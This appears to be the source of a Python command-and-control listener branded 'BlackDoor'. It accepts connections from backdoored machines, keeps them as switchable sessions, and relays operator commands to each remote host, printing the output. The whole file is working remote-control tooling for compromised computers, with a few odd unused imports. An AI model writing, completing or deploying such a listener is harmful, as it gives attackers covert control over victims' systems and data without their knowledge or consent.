import asyncio
from asyncio.windows_events import NULL
from cProfile import label
import socket
import threading
from time import sleep
from turtle import goto
from settings import colors
from termcolor import colored
import os 


os.system('color')

logo = colored("""

▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄ ·▄▄▄▄              ▄▄▄  
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▪     ▪     ▀▄ █·
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌ ▄█▀▄  ▄█▀▄ ▐▀▀▄
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█▌.▐▌▐█▌.▐▌▐█•█▌
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀▀▀▀▀▀•  ▀█▄▀▪ ▀█▄▀▪.▀  ▀

""", "red") + colored("""
   > ******
     Github: s3q
     Instagram: s3qix
""", "yellow") + """
Wait ...

"""


print(logo)


ip = "192.168.1.36"
port = 3080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(5)
print(colored("[+] Listening on ", "white") + colored(ip, "cyan") +":"+ colored(str(port), "cyan"))

conections = {}
session_adress = NULL

def handle(client_socket):
    global c_socket, a_socket
    try:
        c_socket, a_socket = client_socket

        while True:
            buffer = input(colored("[+]", "cyan") + colored("[", "red") + colored(a_socket, "yellow") + colored("] > ", "red")).strip()

            if buffer == "change sessions":
                ask = input("[+] - Do you want to change sission ! Y/N ? ").strip()
                if ask == "Y":
                    print("\n[+] - Open sessions : ")
                    for s_adress in conections:
                        print("[@] - [ "+s_adress+" ]")
                    __a_client = input("\n[-][session][target_ip] > ").strip()
                    if __a_client != "":
                        c_socket = conections[__a_client]
                        a_socket = __a_client
                continue

            elif buffer == "show sessions":
                print(colored("\n[+] - Open sessions : ", "yellow"))
                for s_adress in conections:
                    print("[@] - [ "+colored(s_adress, "yellow")+" ]")
                print("\n")

            else:
                if buffer and buffer != "": 
                    c_socket.send(buffer.encode())
                else:
                    continue
                request = c_socket.recv(100024)
                print(f'{request.decode("utf-8")}')
    except:
        del conections[a_socket]
        print(colored("\n[!] - Session closed ", "red"))

        if len(conections.items()):
            for s_adress in conections:
                print("\n[@] - [ "+s_adress+" ]\n")
            __a_client = input("\n[-][session][target_ip] > ").strip()
            if __a_client != "":
                c_socket = conections[__a_client]
                a_socket = __a_client
                handle((c_socket, __a_client))
        else:
            print(colored("\n[!] - There are no open sessions, wait ...", "white"))
            while True:
                sleep(5)
                if len(conections.items()):
                    for s_adress in conections:
                        print("\n[@] - [ "+s_adress+" ]\n")
                    __a_client = input(colored("[-][session][target_ip] > ", "yellow")).strip()
                    if __a_client != "":
                        c_socket = conections[__a_client]
                        a_socket = __a_client
                        handle((c_socket, __a_client))


def connect():
    client_thread = threading.Thread(target=handle, args=(__client_socket,))
    client_thread.start()


async def main():
    global __client_socket
    global client
    global address

    try:
        while True:
            client, address = server.accept()

            print(colored("\n[+] - Accepted connection from ", "white")+ colored(f"{address[0]}:{address[1]}", "yellow"))

            conections[f"{address[0]}:{address[1]}"] = client
            __client_socket = (client, f"{address[0]}:{address[1]}")

            if __client_socket and __client_socket != "" and len(conections.items()) == 1:
                connect()
            else:
                continue
                    
            

    except KeyboardInterrupt:
        print("[+] - Exit")
        server.close()

asyncio.run(main())